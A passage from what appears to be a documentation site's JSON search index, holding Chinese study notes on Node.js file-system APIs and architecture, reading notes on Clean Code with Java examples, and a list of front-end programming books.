\u91cd\u547d\u540d\u6587\u4ef6\u6216\u8005\u76ee\u5f55","text":"<pre><code>fs.rename(oldPath, newPath, cb)\nfs.renameSync(oldPath, newPath)\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#watch","title":"Watch \u76d1\u63a7\u6587\u4ef6\u7684\u66f4\u6539\u5199\u5165","text":"<p>\uff08\u4f1a\u8f6e\u8be2\uff0c\u9ed8\u8ba45S\uff0c\u6d88\u8017\u6027\u80fd\uff09</p> <pre><code>fs.watchFile(filename, [options], listener)\n\noptions: {\n  persistent: true, // \u5f53\u6587\u4ef6\u6b63\u5728\u88ab\u76d1\u89c6\u65f6\uff0c\u8fdb\u7a0b\u662f\u5426\u7ee7\u7eed\u8fd0\u884c\n  interval: 5007 // \u6bcf\u9694\u591a\u5c11\u6beb\u79d2\u8f6e\u8be2\u4e00\u6b21\n}\nlistener: \u5f53\u6587\u4ef6\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u56de\u8c03\u51fd\u6570\u4f1a\u6267\u884c\n\nfs.watchFile('./test.md', { interval: 1000 }, (curr, prev) =&gt; {\n  // curr \u548c prev \u4e5f\u662f stat \u5bf9\u8c61\n  console.log(curr.mtime - prev.mtime);\n  console.log(curr.size - prev.size);\n});\n</code></pre> <p>\u5176\u4ed6\u65b9\u6cd5</p> <pre><code>fs.chmod(path, mode, callback)\nfa.chmodSync(path, mode)\nfs.appendFile(file, data, [options], callback)\nfs.appendFileSync(file, data, [options])\n</code></pre>"},{"location":"other/nodeJS-basic-upguigu/#_1","title":"\u5176\u4ed6\u8d44\u6599","text":""},{"location":"other/nodeJS-basic-upguigu/#nodejs_1","title":"\u9ed1\u9a6c\u7a0b\u5e8f\u5458 nodeJS \u7b2c\u516b\u5929","text":"<p>2015\u5e749\u670810\u65e5\u7684\u8bfe\u7a0b\uff086\u5e74\u4e86\uff01\uff09\u6ce8\u610f\u65f6\u6548\u6027</p> <p>nodeJS \u662f6\u5e74\u524d\u7684\u7248\u672c\uff0c\u5dee\u8ddd\u592a\u5927\u4e86\uff1b\u6700\u597d\u5b66\u4e60\u6700\u65b0\u7684\u7248\u672c</p>"},{"location":"other/nodeJS-basic-upguigu/#01-nodejs","title":"01 nodeJS \u7b80\u4ecb","text":"<p>\u521b\u5efa\u8005\u548c\u521b\u5efa\u539f\u56e0\u5df2\u7ecf\u5b66\u8fc7\u4e86</p> <ul> <li> <p>\u8bed\u8a00\uff1anodeJS \u4e0d\u662f\u72ec\u7acb\u7684\u8bed\u8a00\uff0c\u4f7f\u7528 JS \u8fdb\u884c\u7f16\u7a0b</p> </li> <li> <p>\u67b6\u6784\uff1a\u4f20\u7edf\u7684\u540e\u53f0\u67b6\u6784\u662f LAMP\uff1alinux+Apache+mysql+php, nodeJS \u4e0d\u9700\u8981\u4f7f\u7528\u670d\u52a1\u5668\u8f6f\u4ef6\u4e0a\uff0c\u4e0e\u7ecf\u5178\u7684\u67b6\u6784\u4e0d\u540c\u3002nodeJS \u6ca1\u6709 web \u5bb9\u5668\u3002</p> </li> </ul>"},{"location":"other/nodeJS-basic-upguigu/#02-nodejs","title":"02 nodeJS \u7279\u70b9","text":"<p>nodeJS uses an event-driven, no-blocking I/O model that makes it lightweight and efficient</p> <p>\u5355\u7ebf\u7a0b+\u975e\u963b\u585e I/O+\u4e8b\u4ef6\u9a71\u52a8</p> <p>\u4f20\u7edf\u670d\u52a1\u5668\u7aef\u8bed\u8a00\u4e2d\uff0c\u591a\u7ebf\u7a0b\u8fde\u63a5\u7528\u6237\uff0c\u6bcf\u4e00\u4e2a\u7528\u6237\u6d88\u8017 2MB \u5185\u5b58\u30028GB\u7684\u670d\u52a1\u5668\u53ef\u4ee5\u8fde\u63a5 4000\u4e2a\u7528\u6237\u3002\u5f53\u7528\u6237\u589e\u52a0\u65f6\uff0c\u786c\u4ef6\u6210\u672c\u4e0a\u5347\u3002</p> <p>nodeJS \u53ea\u4f7f\u7528\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u591a\u7528\u6237\u8bbf\u95ee\u65f6\uff0c\u901a\u8fc7\u5185\u90e8\u4e8b\u4ef6\u8c03\u5ea6\uff0c\u5728\u5b8f\u89c2\u4e0a\u4e5f\u662f\u5e76\u884c\u7684\u30028GB\u7684\u670d\u52a1\u5668\u53ef\u4ee5\u7528\u65f6\u5904\u7406\u8d85\u8fc74\u4e07\u7684\u7528\u6237\u7684\u8fde\u63a5\u3002\u597d\u5904\uff1a\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u9700\u8981\u521b\u5efa\u7ebf\u7a0b\u6216\u8005\u9500\u6bc1\u7ebf\u7a0b\u7684\u65f6\u95f4\uff1b\u7f3a\u70b9\uff0c\u4e00\u65e6\u4e00\u4e2a\u7528\u6237\u9020\u6210\u8fd9\u4e2a\u7ebf\u7a0b\u5954\u6e83\uff0c\u6574\u4e2a\u670d\u52a1\u5c31\u5954\u6e83\u4e86\uff0c\u90a3\u4e48\u5168\u90e8\u7528\u6237\u65e0\u6cd5\u94fe\u63a5\u3002</p> <p>nodeJS \u6267\u884c JS \u4e2d\uff0c\u9ed8\u8ba4\u4e0d\u4f1a\u70ed\u66f4\u65b0\u7a0b\u5e8f\u3002\u66f4\u6539 JS \u540e\uff0c\u9700\u8981\u628a\u670d\u52a1\u5668\u6682\u505c\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c\uff0c\u624d\u80fd\u663e\u793a\u66f4\u6539\u540e \u7684\u5185\u5bb9</p>"},{"location":"other/nodeJS-basic-upguigu/#03-nodejs","title":"03 nodeJS \u539f\u7406","text":"<p>\u5e95\u5c42\u4ee3\u7801\u4e2d\uff0c\u534a\u6570\u7684\u4ee3\u7801\u662f\u4e8b\u4ef6\u961f\u5217\uff0c\u56de\u8c03\u51fd\u6570\u961f\u5217\u7684\u6784\u5efa\uff0c\u7528\u4e8b\u4ef6\u9a71\u52a8\u5b8c\u6210\u4efb\u52a1\u8c03\u5ea6\u3002</p> <p>\u5355\u7ebf\u7a0b\uff1a\u51cf\u5c0f\u5185\u5b58\u5f00\u9500\uff1b\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u5b58\u6362\u9875\u3002</p> <p>\u975e\u963b\u585eIO\uff1a\u4e0d\u4f1a\u7b49\u5f85IO\u6267\u884c\u7ed3\u675f\uff0c\u4f1a\u6267\u884c\u540e\u9762\u7684JS\u8bed\u53e5\u3002</p> <p>\u4e8b\u4ef6\u5faa\u73af\uff08event-loop\uff09\u4e8b\u4ef6\u65b9\u5f0f\u52a0\u5165\u4e8b\u4ef6\u961f\u5217\uff0c\u7b49\u5f85\u6267\u884c\u3002</p> <p>nodeJS \u4e0d\u9002\u5408\u5f00\u53d1\u8fd0\u7b97\u5bc6\u96c6\u7684\u670d\u52a1\uff0c\u4e3b\u8981\u9002\u5408\u5904\u7406\u5927\u91cf\u5e76\u53d1\u7684IO\u3002NodeJS \u9002\u5408\u4e8e web-socket \u914d\u5408\uff0c\u5f00\u53d1\u957f\u8fde\u63a5\u7684\u5b9e\u65f6\u4ea4\u4e92APP\uff08\u7528\u6237\u8868\u5355\u6536\u96c6\uff1b\u804a\u5929\u5ba4\uff1b\u76f4\u64ad\u5ba4\u7b49\uff09\u3002</p> <p>\u5f53\u65f6 NodeJS \u8fd8\u662f\u4e00\u4e2a\u5c0f\u73a9\u5177\uff0c\u6027\u80fd\u8ba1\u7b97\u548c\u4f20\u7edf\u7684 Java \u540e\u7aef\u8bed\u8a00\u7b49\u6ca1\u529e\u6cd5\u6bd4\u3002</p> <p>\u56fd\u5185\uff1a\u5c0f\u516c\u53f8\u4f7f\u7528Node\u505a\u6838\u5fc3\u4e1a\u52a1\uff0c\u5927\u516c\u53f8\u4f7f\u7528Node\u505a\u4e00\u90e8\u5206\u529f\u80fd\u3002</p> <p>\u73b0\u5728\u9879\u76ee\u4e2d\uff0c\u4f7f\u7528 Node \u5904\u7406\u7528\u6237\u64cd\u4f5c\u7684\u540c\u6b65\uff08server\uff09\uff0c\u7528 Python \u5904\u7406\u8868\u5355\u3001\u7528\u6237\u7ba1\u7406\u3001\u5927\u90e8\u5206\u7684 HTTP \u8bf7\u6c42\u7b49\uff1b\u7528 Go \u548c C \u8fdb\u884c\u5e95\u5c42\u8ba1\u7b97\uff0c\u6587\u4ef6\u5b58\u50a8\u3002</p>"},{"location":"other/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","title":"\u4ee3\u7801\u6574\u6d01\u4e4b\u9053 \u8bfb\u4e66\u7b14\u8bb0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7762  \u9605\u8bfb16\u5206\u949f</p> <p>\u4f5c\u8005\u9a6c\u4e01</p>"},{"location":"other/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/#_2","title":"\u7b2c\u4e00\u5f20 \u524d\u8a00","text":"<p>\u4ee3\u7801\u91cd\u6784\uff1a\u7c7b\u4f3c\u4e8e\u673a\u5668\u7684\u65e5\u5e38\u7ef4\u62a4\uff0c\u5c06\u7ec4\u5efa\u7ef4\u62a4\u5230\u6700\u65b0\u7684\u72b6\u6001\uff0c\u786e\u4fdd\u7ec4\u4ef6\u7684\u6b63\u5e38\u8fd0\u884c\u3002\u5199\u51fa\u9605\u8bfb\u6027\u5f88\u597d\u7684\u4ee3\u7801\uff08\u4e0d\u4ec5\u4ec5\u662f\u4ee3\u7801\u7684\u529f\u80fd\u548c\u67b6\u6784\u7684\u5b9e\u73b0\uff09\u3002\u4ee3\u7801\u91cd\u6784\u7c7b\u4f3c\u4e8e\u6574\u7406\u623f\u95f4\u3002\u65e5\u5e38\u529f\u80fd\u7684\u6682\u65f6\u589e\u51cf\uff0c\u6700\u540e\u5b9a\u671f\u8fdb\u884c\u91cd\u6784\uff0c\u6574\u4f53\u4ee3\u7801\u66f4\u6709\u903b\u8f91\u3002</p> <p>\u61c2\u5f97\u5df2\u6709\u529f\u80fd\u548c\u672a\u6765\u9700\u6c42\uff0c\u624d\u80fd\u5728\u5df2\u6709\u4ee3\u7801\u4e0a\u505a\u51fa\u66f4\u597d\u7684\u6539\u8fdb\u3002</p> <p>\u7834\u7a97\u7406\u8bba\uff1a\u5982\u679c\u4e00\u4e2a\u7a97\u6237\u5df2\u7ecf\u7834\u635f\uff0c\u5f88\u4e45\u6ca1\u6709\u4eba\u4fee\u590d\uff0c\u90a3\u4e48\u5176\u4ed6\u7684\u7a97\u6237\u4e5f\u4f1a\u7834\u635f\uff0c\u751a\u81f3\u6709\u4eba\u4e3b\u52a8\u7834\u788e\u7a97\u6237\u3002\u6240\u4ee5\uff0c\u4ee5\u540e\u505a\u7684\u4e8b\u60c5\uff0c\u73b0\u5728\u6700\u597d\u5b8c\u5168\u5904\u7406\u3002later is never.</p> <p>\u540c\u7406\uff0c\u4ee3\u7801\u4e0a\u7684\u5c0f\u95ee\u9898\u4e5f\u9700\u8981\u5904\u7406\uff0c\u89e3\u51b3\u4ee3\u7801\u7684\u5c0f\u95ee\u9898\u3002</p> <p>\u6bcf\u4e2a\u51fd\u6570\u3001\u6bcf\u4e2a\u7c7b\u3001\u6bcf\u4e2a\u7ec4\u4ef6\u90fd\u5173\u6ce8\u4e00\u4e2a\u4e8b\u60c5\uff0c\u4e0d\u4f1a\u88ab\u5468\u8fb9\u5176\u4ed6\u7684\u7ec6\u8282\u5f71\u54cd\u3002\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u7684\u529f\u80fd\u5f88\u591a\uff0c\u53ef\u4ee5\u62bd\u53d6\u6210\u591a\u4e2a\u5bf9\u8c61\u8fdb\u884c\u5b8c\u6210\u3002</p> <p>\u8981\u6c42\uff1a\u80fd\u901a\u8fc7\u6240\u6709\u6d4b\u8bd5\uff1b\u6ca1\u6709\u91cd\u590d\u4ee3\u7801\uff1b\u5b8c\u6210\u5168\u90e8\u8bbe\u8ba1\u7406\u5ff5\uff1b\u5c3d\u91cf\u5c11\u7684\u5b9e\u4f53\uff08\u7c7b\u3001\u65b9\u6cd5\u3001\u51fd\u6570\uff09\u3002</p> <p>\u89c4\u5b9a\uff1a\u4fee\u6539\u4ee3\u7801\u65f6\uff0c\u8ba9\u4ee3\u7801\u6bd4\u6765\u4e4b\u524d\u66f4\u6574\u6d01\uff1b</p>"},{"location":"other/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/#_3","title":"\u7b2c\u4e8c\u7ae0 \u547d\u540d","text":"<p>\u51fd\u6570\u548c\u53d8\u91cf\u540d\u5e94\u8be5\u5c3d\u91cf\u5177\u4f53\uff0c\u6839\u636e\u53d8\u91cf\u540d\u53ef\u4ee5\u770b\u51fa\u53d8\u91cf\u7684\u542b\u4e49\uff0c\u53d8\u91cf\u7684\u6570\u636e\u7c7b\u578b\u7b49\u3002\u53d8\u91cf\u4e2d\u4e0d\u8981\u51fa\u73b0 variable, list \u7b49\uff0c\u53ef\u4ee5\u51fa\u73b0 group\uff0c \u56e0\u4e3a\u53d8\u91cf\u5df2\u7ecf\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u52a0\u5165\u8fd9\u4e2a\u5c31\u662f\u6ca1\u7528\u7684\u3002</p> <p>\u4ee3\u7801 01 <pre><code>public class GuessStaticsMessage {\n\n  // \u521b\u5efa\u7c7b\u53d8\u91cf\n  private String number;\n  private String verb;\n  private String modifier;\n\n  // \u8868\u793a\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u662f void \u8868\u793a\u8fd4\u56de\u503c\u662f\u7a7a\n  public String make(char candidate, int count) {\n    createMessageParts(count);\n    return String.firmat(\n    );\n  }\n\n  // \u6839\u636e\u4e0d\u540c\u7684\u6570\u91cf\u6267\u884c\u4e0d\u540c\u7684\u51fd\u6570\n  private void createDependentMessageParts(int count) {\n    if (count == 0) {\n      thereAreNoLetters();\n    } else if (count == 1) {\n      thereIsOneLetter();\n    } else {\n      thereAreManyLetters(count);\n    }\n  }\n\n  // \u5bf9\u5e94\u4e09\u79cd\u4e0d\u540c\u7684\u5904\u7406\u903b\u8f91\uff0c\u5e76\u6ca1\u6709\u653e\u5728\u4e0a\u9762\u4e00\u4e2a\u51fd\u6570\u5185\u90e8\n  private void thereAreManyLetters(int count) {\n    number = Integer.toString(count);\n    verb = 'are';\n    modifier = 's';\n  }\n\n  private void thereIsOneLetter() {\n    number = '1';\n    verb = 'is';\n    modifier = '';\n  }\n\n  private void thereAreNoLetters() {\n    number = 'no';\n    verb = 'are';\n    modifier = 's';\n  }\n}\n</code></pre></p>"},{"location":"other/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/#_4","title":"\u7b2c\u4e09\u7ae0 \u51fd\u6570","text":"<p>\u51fd\u6570\u9700\u8981\u77ed\u5c0f\uff1b\u6700\u597d\u4e0d\u8d85\u8fc720\u884c\uff08\u5982\u679c\u8d85\u8fc720\u884c\u7684\u51fd\u6570\uff0c\u9700\u8981\u5206\u6790\u51fd\u6570\u7684\u529f\u80fd\u662f\u5426\u5355\u4e00\uff0c\u662f\u5426\u53ef\u4ee5\u62c6\u5206\u6210\u591a\u4e2a\u51fd\u6570\uff0c\u662f\u5426\u53ef\u4ee5\u53bb\u6389\u65e0\u5173\u529f\u80fd\uff09</p> <p>if else if \u7b49\u907f\u514d\u4e0d\u5fc5\u8981\u7684\u6362\u884c\u3002\u4e00\u4e2a\u51fd\u6570\u4f53\u5185\u90e8\u4e0d\u8981\u4e09\u5c42\u7684if\u5d4c\u5957\u3002</p> <p>\u51fd\u6570\u5e94\u8be5\u505a\u597d\u4e00\u4ef6\u4e8b\uff0c\u6700\u597d\u8fd9\u4ef6\u4e8b\uff0c\u53ea\u505a\u8fd9\u4ef6\u4e8b\u3002</p> <p>\u51fd\u6570\u7684\u53c2\u6570\u5c3d\u91cf\u5c11\uff08\u6700\u597d\u662f0-1\uff0c\u4e0d\u8981\u8d85\u8fc73\u4e2a\u53c2\u6570\uff09\u2014\u2014\u540c\u7406\uff0c\u7ec4\u4ef6\u7684props\u4e5f\u5c3d\u91cf\u7b80\u5355\uff0c\u5c3d\u91cf\u5c11\u3002\u8fd9\u6837\u4f7f\u7528\u51fd\u6570\u6216\u8005\u590d\u7528\u7ec4\u4ef6\u66f4\u65b9\u4fbf\u3002\u51fd\u6570\u53c2\u6570\u8f83\u5c11\u6709\u76ca\u4e8e\u6d4b\u8bd5\u3002\u6240\u4ee5\u8bf4\uff0c\u5411\u51fd\u6570\u4e2d\u4f20\u9012\u5e03\u5c14\u503c\u7684\u505a\u6cd5\u4e0d\u89c4\u8303\uff08\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u8fdb\u884c\u5f3a\u5236\u6570\u636e\u8f6c\u6362\uff0c\u5982\u679c\u4f7f\u7528\u5355\u4e00\u7684\u5f00\u5173\u51fd\u6570\u63a7\u5236\u7ec4\u4ef6\u53ef\u80fd\u6548\u679c\u66f4\u597d\uff09\u3002\u8fd9\u6837\u53ef\u4ee5\u8bbe\u7f6e\u4e24\u4e2a\u65e0\u53c2\u6570\u51fd\u6570\u3002</p> <p>\u5982\u679c\u51fd\u6570\u7684\u53c2\u6570\u5929\u7136\u5c31\u662f\u4e00\u5bf9\uff08\u5750\u6807xy\u7b49\uff09\uff0c\u90a3\u4e48\u8fd9\u6837\u6bd4\u4f20\u5165\u4e00\u4e2a\u5bf9\u8c61\u5305\u542b\u4e24\u4e2a\u5c5e\u6027\u66f4\u597d\u3002\u5176\u4ed6\u7684\u4e8c\u53c2\u6570\u6216\u8005\u4e09\u53c2\u6570\uff0c\u8fd9\u6837\u53ef\u80fd\u9020\u6210\u53c2\u6570\u7684\u987a\u5e8f\u9519\u8bef\uff0c\u4f7f\u7528\u4e0d\u662f\u5f88\u65b9\u4fbf\u3002\u5982\u679c\u662f\u4e09\u4e2a\u53c2\u6570\uff0c\u90a3\u4e48\u4e09\u4e2a\u53c2\u6570\u54ea\u4e2a\u662f\u53ef\u9009\u53c2\u6570\uff0c\u54ea\u4e2a\u53c2\u6570\u662f\u4ec0\u4e48\u6570\u636e\u7c7b\u578b\u7b49\u95ee\u9898\u5c31\u4f1a\u5f88\u9ebb\u70e6\u3002\u5982\u679c\u662f\u4e09\u4e2a\u53c2\u6570\uff0c\u6700\u597d\u5c01\u88c5\u6210\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <p>\u51fd\u6570\u540c\u65f6\u6ca1\u6709\u526f\u4f5c\u7528\u3002\u4e00\u4e2a\u51fd\u6570\u6267\u884c\u65f6\uff0c\u4e0d\u80fd\u5f71\u54cd\u7ec4\u4ef6\u5185\u90e8\u7684\u5176\u4ed6\u5c5e\u6027\u6216\u8005\u51fd\u6570\u7684\u6267\u884c\u3002</p> <p>\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u8f93\u51fa\u51fd\u6570\u3002\u5982\u679c\u51fd\u6570\u5fc5\u987b\u4fee\u6539\u67d0\u79cd\u72b6\u6001\u65f6\uff0c\u6700\u597d\u4fee\u6539\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\uff08\u9664\u53bb\u5de5\u5177\u51fd\u6570\uff09\u3002</p> <p>\u62bd\u79bb try-catch \u7ed3\u6784\u3002\u8fd9\u6837\u51fd\u6570\u7684\u4e3b\u8981\u903b\u8f91\u548c\u9519\u8bef\u6355\u83b7\u4f1a\u66f4\u597d\u5206\u79bb\u3002</p> <p>\u4ee3\u7801 02 <pre><code>// \u8fd9\u53ea\u4e00\u4e2a web \u6d4b\u8bd5\u6846\u67b6\n// htmlUtil.java\npublic static String renderPageWithSetupsAndTreardowns (\n  PageData PageData, boolean isSuite\n) throws Exception {\n  boolean isTestPage = pageData.hasAttribute(\"Test\");\n  if (isTestPage) {\n    WikiPage testPage = pageData.getWikiPage();\n    StringBuffer newPageCountent = new StringBuffer();\n    includeSetupPages(testPage, newPageCountent, isSuite);\n    newPageCountent.append(pageData, getContent());\n    includeTeardownPages(testPage, newPageCountent, isSuite);\n    pageData.setContent(newPageCountent.toString());\n  }\n  return pageData.getHtml();\n}\n</code></pre></p> <p>\u4ee3\u7801 03 <pre><code>public void delete(Page page) {\n  try {\n    deletePageAndAllReferences(page);\n  }\n  catch (Exception error) {\n    logError(e);\n  }\n}\n\nprivate void deletePageAndAllReferences(Page oage) throws Exception {\n  deletePage(page);\n  registry.deleteRefrence(page.name);\n  configKeys.deleteKey(page.name.makeKey());\n}\n\nprivate void logError(Exception e) {\n  logger.log(e.getMessgae());\n}\n</code></pre></p> <p>\u51fd\u6570\u5f00\u59cb\u8bbe\u8ba1\u65f6\uff0c\u53ef\u80fd\u51fd\u6570\u529f\u80fd\u548c\u51fd\u6570\u53c2\u6570\u7b49\u548c\u6700\u540e\u7684\u529f\u80fd\u4e0d\u5408\u9002\u3002\u6240\u4ee5\u4ee3\u7801\u9700\u8981\u6253\u78e8\u3002</p> <p>\u4ee3\u7801 04 <pre><code>package fitnesse.html;\n\nimport fitnesse.responder.run.SuiteResponder;\nimport fitnesse.wiki.*;\n\npublic class SetupTeardownIncluder {\n\n  private PageData PageData;\n  private boolean isSuite;\n  private WikiPage testPage;\n  private StringBuffer testPage;\n  private PageCrawler PageCrawler;\n\n  public static String render(PageData PageData) throw Exception {\n    return render(PageData, false);\n  }\n\n  public static String render(PageData PageData, boolean isSuite) throws Exception {\n    return new SetupTeardownIncluder(PageData).render(isSuite);\n  }\n\n  private SetupTeardownIncluder(PageData PageData) {\n    this.PageData = PageData;\n    testPage = PageData.getWikiPage();\n    pageCrawler = testPage.getPageCrawler();\n    newPageContent = new StringBUffer();\n  }\n\n  private String render(blloean isSuite) throws Exception {\n    this.isSuite = isSuite;\n    if (isTestPage())\n      includeSetupAndTeardownPages();\n    return pageData.getHtml();\n  }\n\n  private boolean isTestPage() throws Exception {\n    return pageData.hasAttribute(\"Test\");\n  }\n\n  private void includeSetupAndTeardownPages() throws Exception {\n    includeSetupPages();\n    includePageContent();\n    includeTeardownPages();\n    updatePageContent();\n  }\n}\n</code></pre></p> <p>\u4e2a\u4eba\u611f\u60f3\uff1a\u5b9e\u9645\u9879\u76ee\u4e2d\u7684\u51fd\u6570\u6216\u8005\u7ec4\u4ef6\uff0c\u53ef\u80fd\u6709\u8d85\u8fc75\u4e2a\u53c2\u6570\uff0c\u6216\u8005\u8d85\u8fc720\u4e2a props\uff0c\u56e0\u4e3a\u4e0d\u540c\u4eba\u5f00\u53d1\u4e0d\u540c\u529f\u80fd\u65f6\uff0c\u4f1a\u53cd\u590d\u6539\u52a8\u4e00\u4e2a\u51fd\u6570\u548c\u7ec4\u4ef6\uff0c\u540c\u65f6\u81ea\u5df1\u6ca1\u6709\u7cbe\u529b\u91cd\u6784\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u6240\u4ee5\u8fd9\u5c31\u662f\u5df2\u6709\u7684\u4e0d\u597d\u7684\u4ee3\u7801\u3002\u53ef\u80fd\u662f\u6545\u610f\u5199\u6210\u522b\u4eba\u4e0d\u4fbf\u4e8e\u9605\u8bfb\u7684\u51fd\u6570\uff0c\u53ef\u80fd\u662f\u5386\u53f2\u6539\u52a8\u9020\u6210\u7684\u95ee\u9898\u3002\u5c3d\u91cf\u8ba9\u81ea\u5df1\u5199\u7684\u51fd\u6570\u6216\u7ec4\u4ef6\u53ef\u8bfb\u53ef\u7406\u89e3\u3002</p>"},{"location":"other/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/#_5","title":"\u7b2c\u56db\u7ae0 \u6ce8\u91ca","text":"<p>\u6ce8\u91ca\u7684\u4f5c\u7528\u662f\u89e3\u91ca\u5199\u7684\u4e0d\u597d\u7684\u4ee3\u7801\uff08\u8fd9\u90e8\u5206\u4ee3\u7801\u5e76\u4e0d\u80fd\u901a\u8fc7\u51fd\u6570\u540d\u6216\u8005\u53d8\u91cf\u540d\u770b\u51fa\u5176\u4e2d\u7684\u4f5c\u7528\uff09\u6240\u4ee5\u9700\u8981\u5fc5\u8981\u7684\u6ce8\u91ca\u3002\uff08\u4e2a\u4eba\u5b66\u4e60\u7684\u6ce8\u91ca\u4f1a\u8bf4\u660e\u4e0b\u53c2\u6570\u7684\u7c7b\u578b\u548c\u53d8\u91cf\uff09\u5bf9\u4e8eJAVA\u7b49\u7c7b\u578b\u660e\u786e\u7684\u8bed\u8a00\u53ef\u4ee5\u5c11\u7528\u6ce8\u91ca\uff0c\u5bf9\u4e8eJS\u7b49\u6570\u636e\u8f6c\u6362\u5f88\u7075\u6d3b\u7684\u8bed\u8a00\u5c3d\u91cf\u5c11\u5199\u6ce8\u91ca\uff0c\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u6ce8\u91ca\u3002</p> <p>\u51fd\u6570\u7684\u529f\u80fd\u4f1a\u66f4\u6539\uff0c\u4f46\u662f\u6ce8\u91ca\u4e0d\u4e00\u5b9a\u53ca\u65f6\u66f4\u6539\uff0c\u90a3\u4e48\u6ce8\u91ca\u4e0d\u4e00\u5b9a\u4f1a\u51c6\u786e\u63cf\u8ff0\u51fd\u6570\u7684\u4f5c\u7528\u3002</p> <p>\u4e2a\u4eba\u611f\u60f3\uff1a\u7cbe\u81f4\u7684\u4ee3\u7801\u4e0d\u9700\u8981\u6ce8\u91ca\uff08\u5b9e\u9645\u4e0a\u4ee3\u7801\u5199\u7684\u53ef\u80fd\u6709\u95ee\u9898\uff0c\u6700\u597d\u8fd8\u662f\u52a0\u4e0a\u8bf4\u660e\uff0c\u4fbf\u4e8e\u81ea\u5df1\u4f7f\u7528\uff0c\u4fbf\u4e8e\u6574\u4f53\u56e2\u961f\u9605\u8bfb\u7b49\uff09\u4e2a\u4eba\u548c\u56e2\u961f\u7684\u82f1\u6587\u80fd\u529b\u5e76\u4e0d\u5f3a\uff0c\u6240\u4ee5\u53d8\u91cf\u540d\u548c\u51fd\u6570\u540d\u4e0d\u4e00\u5b9a\u4ee3\u8868\u51fd\u6570\u7684\u610f\u601d\u3002\u603b\u4e4b\uff1a\u7b80\u5355\u7684\u51fd\u6570\u4e0d\u9700\u8981\u52a0\u6ce8\u91ca\uff0c\u590d\u6742\u7684\u51fd\u6570\uff0c\u7279\u6b8a\u60c5\u51b5\u7684\u5904\u7406\uff0c\u9700\u8981\u52a0\u6ce8\u91ca\u548c\u5f15\u7528\u94fe\u63a5\uff08Stack Overflow\uff09\u3002</p> <p>\u8bfb\u5230 86 \u9875\u3002</p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/","title":"\u5176\u4ed6\u4e66\u5355","text":""},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#html","title":"HTML","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 6495  \u9605\u8bfb13\u5206\u949f</p> <p>\u300a\u9ad8\u6027\u80fdHTML5\u300b </p> <p>\u300aHTML5\u89e6\u6478\u754c\u9762\u8bbe\u8ba1\u4e0e\u5f00\u53d1\u300b </p> <p>\u300aHTML5\u79fb\u52a8Web\u5f00\u53d1\u5b9e\u6218\u300b </p> <p>\u300aHTML5\u6743\u5a01\u6307\u5357\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#css","title":"CSS","text":"<p>\u300a\u7cbe\u5f69\u7edd\u4f26\u7684CSS\u300b</p> <p>\u300a\u56fe\u89e3CSS3 \u6838\u5fc3\u6280\u672f\u4e0e\u6848\u4f8b\u5b9e\u6218\u300b </p> <p>\u300aCSS\u7985\u610f\u82b1\u56ed \u300b </p> <p>\u300aCSS\u63ed\u79d8\u300b </p> <p>\u300a\u8d85\u8d8aCSS Web\u8bbe\u8ba1\u827a\u672f\u7cbe\u9ad3\u300b</p> <p>\u300aCSS\u6743\u5a01\u6307\u5357\uff08\u7b2c\u4e09\u7248\uff09\u300b </p> <p>\u300a\u9ad8\u6d41\u91cf\u7f51\u7ad9CSS\u5f00\u53d1\u6280\u672f\u300b </p>"},{"location":"other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/#javascript","title":"JavaScript","text":"<p>\u300aJavaScript\u5fcd\u8005\u79d8\u7c4d\u300b \u4e66\u6458</p> <p>\u300a\u4f60\u4e0d\u77e5\u9053\u7684JavaScript\u300b\u7cfb\u5217 \u4e66\u6458</p> <p>\u300aJavaScript\u51fd\u6570\u5f0f\u7f16\u7a0b\u6307\u5357\u300b </p> <p>\u300a\u5927\u578bJavaScript\u5e94\u7528\u6700\u4f73\u5b9e\u8df5\u6307\u5357\u300b </p> <p>\u300aJavaScript\u7f16\u7a0b\u7cbe\u89e3(\u7b2c2\u7248)\u300b </p> <p>\u300aES6\u6807\u51c6\u5165\u95e8\u300b </p> <p>\u300aJavaScript\u6846\u67b6\u8bbe\u8ba1\u300b </p> <p>\u300a\u7f16\u5199\u9ad8\u8d28\u91cfJavaScript\u4ee3\u7801\u768468\u4e2a\u6709\u6548\u65b9\u6cd5\u300b </p> 